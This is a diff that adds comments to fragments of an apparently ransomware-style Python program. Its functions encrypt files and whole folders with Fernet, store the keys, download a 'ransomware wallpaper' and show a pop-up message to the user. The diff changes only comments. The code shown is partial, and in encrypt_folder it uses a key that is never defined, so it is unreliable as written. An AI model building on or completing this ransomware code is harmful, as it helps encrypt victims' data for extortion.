@@ -15,13 +15,19 @@ from tkinter import messagebox
 def generate_key():
     return Fernet.generate_key()
 
+
+# Loads key from file and returns it
 def load_key(key_path):
     return open(key_path, "rb").read()
 
+
+# Writes key to specified path
 def write_key(key, key_path):
     with open(key_path, "wb") as key_file:
         key_file.write(key)
 
+
+# Ecnrypts file
 def encrypt_file(filepath, key):
 
     fernet = Fernet(key)
@@ -35,6 +41,7 @@ def encrypt_file(filepath, key):
         file.write(encrypted_data)
 
 
+# Decrypts file
 def decrypt_file(filepath, key):
     
     fernet = Fernet(key)
@@ -48,6 +55,7 @@ def decrypt_file(filepath, key):
         file.write(decrypted_data)
 
 
+# Encrypts message/string
 def encrypt_message(message, key):
 
     fernet = Fernet(key)
@@ -56,6 +64,7 @@ def encrypt_message(message, key):
     return encrypted_message
 
 
+# Decrypts message/string
 def decrypt_message(encrypted_message, key):
     
     fernet = Fernet(key)
@@ -64,6 +73,7 @@ def decrypt_message(encrypted_message, key):
     return decrypted_message.decode()
 
 
+# Defines the path where the key used to encrypt file/string will be saved
 def key_file(filepath):
     dir_name, base_name = os.path.split(filepath)
     key_filename = f"key{base_name}"
@@ -71,16 +81,19 @@ def key_file(filepath):
     return key_filepath
 
 
+# Defines the path to save the encrypted message/string
 def message_path(filepath):
     message_path = os.path.join(filepath, "encryptedmessage.txt")
     return message_path
 
 
+# Writes the encrypted message/string to that file
 def write_message(message, message_path):
     with open(message_path, "wb") as message_file:
         message_file.write(message)
 
 
+# Encrypts folder
 def encrypt_folder(folder_path, message_path):
     for root, dirs, files in os.walk(folder_path):
         for file in files:
@@ -88,6 +101,7 @@ def encrypt_folder(folder_path, message_path):
             encrypt_file(file_path, key)
 
 
+# Decrypts folder
 def decrypt_folder(folder_path, key):
     for root, dirs, files in os.walk(folder_path):
         for file in files:
@@ -95,11 +109,13 @@ def decrypt_folder(folder_path, key):
             decrypt_file(file_path, key)
     
 
+# Creates the path for the key used to encrypt a folder
 def folderkey_path(filepath):
     message_path = os.path.join(filepath, "folderkey.txt")
     return message_path
 
 
+# Download ransomware wallpaper
 def download_image(url, local_path):
     response = requests.get(url)
     if response.status_code == 200:
@@ -107,6 +123,7 @@ def download_image(url, local_path):
             file.write(response.content)
     else:
         raise Exception(f"Failed to download image from {url}")
+
 
 # Creates pop-up with a message for the user
 def show_popup():
